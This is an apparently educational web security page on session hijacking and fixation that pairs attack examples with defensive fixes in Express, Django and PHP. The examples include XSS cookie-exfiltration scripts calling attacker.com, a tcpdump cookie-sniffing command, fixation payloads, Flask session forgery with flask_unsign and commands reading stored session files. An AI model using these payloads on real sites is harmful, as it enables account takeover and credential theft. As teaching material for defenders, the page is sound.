Session Fixation & Hijacking

CWE-384 · CWE-287 · Steal or force a session token — then impersonate the victim without knowing their password

A session token is the key that proves authentication — steal it and you own the account without needing the password. Session attacks fall into two categories: hijacking (stealing an existing valid token) and fixation (forcing the victim to use a token you already know).

Session hijacking requires stealing a valid session token. Here are all the ways it leaks.

① XSS — the primary cookie theft vectorCritical
<!-- If HttpOnly is NOT set on the session cookie: --> <script> // Read cookie and exfiltrate document.location = 'https://attacker.com/steal?c=' + document.cookie; // OR: new Image().src = 'https://attacker.com/steal?c=' + btoa(document.cookie); // OR via fetch: fetch('https://attacker.com/steal', { method: 'POST', body: document.cookie }); </script> // HttpOnly flag blocks document.cookie access // But XSS can still make authenticated requests directly: fetch('/api/transfer', {credentials:'include', method:'POST', body:'to=attacker&amount=1000'});
② Session token in URL — Referer leakageHigh
# Some apps pass session as URL parameter instead of cookie: https://app.com/dashboard?session=abc123def456 # This session token is now: # - Visible in browser address bar # - Stored in browser history # - Sent in Referer header to ALL external resources (analytics, ads, CDNs) # - Logged in server access logs # - Stored by any proxy/CDN in the path # Referer header leak: GET /analytics HTTP/1.1 Host: analytics.third-party.com Referer: https://app.com/dashboard?session=abc123def456 # → Third party has the session token!
③ Network interception — unencrypted cookiesHigh
# Cookie without Secure flag sent over HTTP: GET /dashboard HTTP/1.1 Host: app.com Cookie: session=abc123 ← plaintext on the wire! # On public WiFi: attacker runs: tcpdump -i wlan0 -A 'tcp port 80' | grep -i cookie # Captures session tokens in plaintext # Even HTTPS sites are vulnerable if: # 1. Session cookie lacks Secure flag (sent over HTTP too) # 2. App responds to HTTP without HSTS (SSL stripping possible) # 3. Mixed content loads HTTP resources with cookie # Cookie with Secure flag: only sent over HTTPS — not capturable this way
④ Subdomain cookie scope attackMedium
# Cookie scoped to parent domain (.app.com) is sent to ALL subdomains Set-Cookie: session=abc123; Domain=.app.com; HttpOnly; Secure # If ANY subdomain has XSS or is attacker-controlled (subdomain takeover): # - evil.app.com gets the session cookie in requests # - XSS on docs.app.com can read cookies from .app.com # (HttpOnly blocks JS read, but request-based steal still works) # Cookies scoped to exact domain only: no leading dot Set-Cookie: session=abc123; Domain=app.com # safe — exact domain only

Session fixation is the inverse of hijacking — the attacker doesn't steal a token, they plant one they already know, then wait for the victim to authenticate with it.

Classic session fixation attackHigh
# Step 1: Attacker visits app, gets a pre-auth session token GET https://app.com/ Set-Cookie: session=ATTACKER_KNOWN_TOKEN # Step 2: Attacker sends victim a link that sets this session # Method A: URL parameter (if app accepts session via URL) https://app.com/login?session=ATTACKER_KNOWN_TOKEN # Method B: Meta refresh <meta http-equiv="Set-Cookie" content="session=ATTACKER_KNOWN_TOKEN"> # Method C: If attacker controls a subdomain (XSS / takeover) document.cookie = "session=ATTACKER_KNOWN_TOKEN; domain=.app.com; path=/"; # Step 3: Victim clicks link → logs in # Vulnerable server: "session exists, just upgrade it to authenticated" # Server marks ATTACKER_KNOWN_TOKEN as authenticated for victim's account # Step 4: Attacker uses ATTACKER_KNOWN_TOKEN → now authenticated as victim!
The fix — regenerate session ID on privilege change
# The root cause: server reuses the same session token before and after login # Fix: issue a BRAND NEW session ID on every privilege change # Vulnerable code (PHP): session_start(); // ... validate credentials ... $_SESSION['user'] = $user; // WRONG: same session ID still in use! # Secure code (PHP): session_start(); // ... validate credentials ... session_regenerate_id(true); // ← destroys old session, creates new ID $_SESSION['user'] = $user; // new session ID now holds the authenticated state # Also regenerate on: # - Login (unauthenticated → authenticated) # - Privilege escalation (user → admin) # - Password change # - Logout (authenticated → anonymous) — invalidate the old ID

Beyond stealing tokens — what if you can predict or calculate them?

Predictable session tokens
# Examples of dangerously weak session IDs seen in the wild: # Sequential integers session=1001, 1002, 1003... → enumerate other users' sessions! # Timestamp-based session=1711670400000 → millisecond timestamp — guessable # User ID only session=user_42 → completely predictable # MD5 of predictable data session=md5(username + timestamp) → if attacker knows username, can brute-force timestamp # Short tokens (too few bits of entropy) session=a3f9 → 4 hex chars = 65,536 possibilities → brute forceable # Test for weak tokens: # 1. Log in multiple times, collect session IDs # 2. Look for patterns: sequential, timestamp-based, short # 3. Try incrementing/decrementing IDs # 4. Run Burp Sequencer to statistically analyze entropy # Burp Sequencer — analyze token randomness: # Intercept session cookie → Send to Sequencer → Analyze # Reports: effective bits of entropy (should be 128+ bits)
Session puzzling — shared tokens, collision attacks
# Session variable confusion: # App uses same session variable for different purposes # $_SESSION['user'] used for both: login state AND password reset token # Attacker triggers password reset for their own account: # $_SESSION['user'] = 'attacker_reset_token' # Then navigates to a page that checks $_SESSION['user'] for login # Server sees session variable set → treats as logged in! # Flask/Python — insecure client-side session (signed but not encrypted) # Flask default: session stored in cookie as base64(JSON), signed with SECRET_KEY # If SECRET_KEY is weak or leaked: forge any session value import flask_unsign token = flask_unsign.sign({'user_id': 1, 'role': 'admin'}, secret='secret') # → Full admin session with weak secret
Session donation / cross-user contamination
# Scenario: shared hosting or misconfigured server # Multiple users' sessions stored in the same file/DB with predictable keys # PHP default: session stored in /tmp/sess_[SESSION_ID] # If /tmp is world-readable: any local user can read sessions! ls /tmp/sess_* cat /tmp/sess_abc123 # → serialized session data including auth state # Shared cache poisoning: # If session stored in shared Redis without proper namespacing: redis-cli GET "session:abc123" # → victim's session data # Fix: use strong namespacing and access controls for session storage
① Regenerate session ID on every privilege change Fixes fixation
The single most important fix for session fixation. Issue a brand new session ID at login, privilege escalation, and logout.
## Node.js / Express app.post('/login', async (req, res) => { const user = await authenticate(req.body); if (!user) return res.status(401).json({ error: 'Invalid credentials' }); // Regenerate session ID — destroys old session, creates new one req.session.regenerate((err) => { req.session.userId = user.id; req.session.role = user.role; res.json({ success: true }); }); }); // Also on logout: destroy the session entirely app.post('/logout', (req, res) => { req.session.destroy(); res.clearCookie('connect.sid'); res.redirect('/'); });
② Set all four cookie security flags Essential
Each flag blocks a different attack vector. All four should be set on every session cookie.
## Node.js / Express app.use(session({ secret: process.env.SESSION_SECRET, name: '__Host-session', // __Host- prefix: forces Secure + no Domain cookie: { httpOnly: true, // blocks document.cookie XSS theft secure: true, // only sent over HTTPS sameSite: 'strict', // blocks CSRF + cross-site leakage maxAge: 30 * 60 * 1000, // 30-minute expiry domain: 'app.example.com', // exact domain — not .app.example.com path: '/' } })); ## Python / Django settings.py SESSION_COOKIE_HTTPONLY = True SESSION_COOKIE_SECURE = True SESSION_COOKIE_SAMESITE = 'Strict' SESSION_COOKIE_AGE = 1800 # 30 minutes SESSION_COOKIE_DOMAIN = None # exact current domain
③ Use cryptographically strong session IDs Essential
Session IDs must be unpredictable — at least 128 bits of entropy from a CSPRNG. Never use sequential IDs, timestamps, or hashes of predictable data.
## Node.js — use express-session with default crypto.randomBytes // express-session generates 128-bit random IDs by default // Never override genid with predictable logic ## Python import secrets session_id = secrets.token_urlsafe(32) # 256 bits of entropy ## PHP — use session_regenerate_id() — PHP's built-in CSPRNG // Never roll your own: no md5(time()), no uniqid() ## Verify with Burp Sequencer: // Collect 100+ session tokens → Sequencer → Analyze // "Effective entropy" should be 100+ bits
④ Implement session timeout and binding Defence in depth
Even stolen tokens should expire quickly. Binding the session to additional context (IP, User-Agent) makes stolen tokens harder to reuse — though not foolproof.
## Absolute and idle timeout session.absolute_timeout = 8 * 60 * 60 # 8 hours max session.idle_timeout = 30 * 60 # 30 min inactivity if (Date.now() - session.lastActivity > IDLE_TIMEOUT) { session.destroy(); return res.redirect('/login?reason=timeout'); } session.lastActivity = Date.now(); ## Soft session binding (anomaly detection, not hard block) // On session use, check if IP or UA changed significantly // Log and alert, optionally require re-auth for sensitive actions // Don't hard-block on IP change alone — mobile users roam
⑤ Checklist
Regenerate session ID on login, privilege change, and logout  ·  Set HttpOnly — blocks JS cookie theft via XSS  ·  Set Secure — only sent over HTTPS  ·  Set SameSite=Strict — blocks cross-site leakage and CSRF  ·  Use __Host- cookie prefix for maximum scope restrictions  ·  Never put session tokens in URLs  ·  128+ bits entropy from CSPRNG — never sequential or timestamp-based  ·  Idle and absolute session timeouts  ·  On logout: destroy server-side session, clear cookie, redirect
